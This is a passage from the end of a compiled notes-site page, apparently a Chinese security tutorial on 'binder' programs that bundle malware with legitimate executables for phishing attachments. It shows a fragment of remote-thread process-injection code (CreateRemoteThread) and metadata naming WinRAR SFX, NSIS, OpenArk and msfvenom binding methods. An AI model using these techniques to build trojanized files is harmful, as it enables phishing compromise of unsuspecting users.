</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">RETSIZE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CloseHandle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(Thread);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>CreateRemoteThread</code> 在远程进程中创建线程，起始地址为 <code>ADDRESS</code>，参数为 <code>pRemoteParam</code>。</li><li>使用 <code>CloseHandle</code> 关闭线程句柄。</li></ul></li></ul><hr><h2 id="todo" tabindex="-1"><a class="header-anchor" href="#todo"><span>TODO</span></a></h2><ul><li><a href="https://www.google.com/search?q=%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F&amp;sca_esv=2696dd68aa1c6147&amp;sxsrf=ADLYWIInMXJ-IiDGkiR1tdoxmNEVOxDrTA%3A1719480856115&amp;ei=GDJ9ZovfBqu1vr0PqsWQ6A4&amp;ved=0ahUKEwiLy4GtvfuGAxWrmq8BHaoiBO0Q4dUDCBA&amp;uact=5&amp;oq=%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F&amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiDOaNhue7keeoi-W6j0jtB1DZBVjcBnABeACQAQCYAWqgAdIBqgEDMC4yuAEDyAEA-AEBmAIAoAIAmAMAiAYBkgcAoAePAQ&amp;sclient=gws-wiz-serp#ip=1" target="_blank" rel="noopener noreferrer">捆绑程序 - Google Search</a></li><li>整个 Go 或者 Rust 写的捆绑程序</li></ul><hr>`,194)]))}const d=s(n,[["render",h],["__file","捆绑程序.html.vue"]]),r=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F.html","title":"捆绑程序","lang":"zh-CN","frontmatter":{"category":["网络安全","网络钓鱼"],"tags":["钓鱼附件","可执行程序","捆绑程序"],"excerpt":"网络钓鱼攻击者可能会将恶意软件捆绑到合法程序中，以便在用户运行合法程序时执行恶意软件。","description":"捆绑程序 捆绑程序 利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序 相关链接 NSIS捆绑程序 OpenArk捆绑程序 制作步骤 msfvenom捆绑程序 cpp实现捆绑程序(TODO) threadProc main 从资源中提取 .docx 文件 打开 .docx 文件 实现自删除 TODO 利用Winrar创建SFX(自解压)打包...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F.html"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"捆绑程序"}],["meta",{"property":"og:description","content":"捆绑程序 捆绑程序 利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序 相关链接 NSIS捆绑程序 OpenArk捆绑程序 制作步骤 msfvenom捆绑程序 cpp实现捆绑程序(TODO) threadProc main 从资源中提取 .docx 文件 打开 .docx 文件 实现自删除 TODO 利用Winrar创建SFX(自解压)打包..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/image-20240429162640096.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"钓鱼附件"}],["meta",{"property":"article:tag","content":"可执行程序"}],["meta",{"property":"article:tag","content":"捆绑程序"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"捆绑程序\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429162640096.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429150415492.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429151231670.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429151743366.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429151758013.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429151843345.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429152043450.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429152204461.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429152352945.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/image-20240429153043430.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171750185.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181019336.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181032137.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181034116.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181036498.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181041070.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181043302.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407181042143.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171115466.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171128899.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171135121.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171136547.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171449258.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171623638.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407171624408.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191534695.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191139278.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191139419.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191140569.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191140019.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191141081.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191141986.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191141508.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191142760.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191143239.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191127940.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191144194.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191450522.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191453016.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191453348.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191514681.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191521357.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191533669.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191545205.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191537421.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191538894.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191539004.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191539087.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202407191540988.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-04-29T09:14:00.000Z"},"headers":[{"level":2,"title":"利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序","slug":"利用winrar创建sfx-自解压-打包捆绑恶意程序与合法程序","link":"#利用winrar创建sfx-自解压-打包捆绑恶意程序与合法程序","children":[{"level":3,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}]},{"level":2,"title":"NSIS捆绑程序","slug":"nsis捆绑程序","link":"#nsis捆绑程序","children":[]},{"level":2,"title":"OpenArk捆绑程序","slug":"openark捆绑程序","link":"#openark捆绑程序","children":[{"level":3,"title":"制作步骤","slug":"制作步骤","link":"#制作步骤","children":[]}]},{"level":2,"title":"msfvenom捆绑程序","slug":"msfvenom捆绑程序","link":"#msfvenom捆绑程序","children":[]},{"level":2,"title":"cpp实现捆绑程序(TODO)","slug":"cpp实现捆绑程序-todo","link":"#cpp实现捆绑程序-todo","children":[{"level":3,"title":"threadProc","slug":"threadproc","link":"#threadproc","children":[]},{"level":3,"title":"main","slug":"main","link":"#main","children":[]}]},{"level":2,"title":"TODO","slug":"todo","link":"#todo","children":[]}],"git":{"createdTime":1714382040000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@gmail.com","commits":6,"url":"https://github.com/233"},{"name":"233JG","username":"233JG","email":"ayusummer233@gmail.com","commits":2,"url":"https://github.com/233JG"}]},"readingTime":{"minutes":33.09,"words":9928},"filePathRelative":"网络安全/钓鱼/钓鱼附件/可执行程序/捆绑程序.md","localizedDate":"2024年4月29日","autoDesc":true}');export{d as comp,r as data};
